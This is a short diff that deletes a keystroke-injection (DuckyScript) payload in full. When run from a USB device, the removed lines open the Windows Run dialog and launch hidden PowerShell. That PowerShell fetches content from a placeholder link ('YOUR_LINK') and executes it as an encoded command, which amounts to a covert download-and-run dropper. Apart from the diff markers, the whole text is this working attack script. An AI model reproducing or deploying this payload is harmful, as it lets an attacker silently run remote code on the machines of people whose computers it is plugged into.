@@ -1,6 +1,0 @@
-DELAY 2000
-GUI r
-DELAY 200
-STRING powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
-DELAY 100
-ENTER
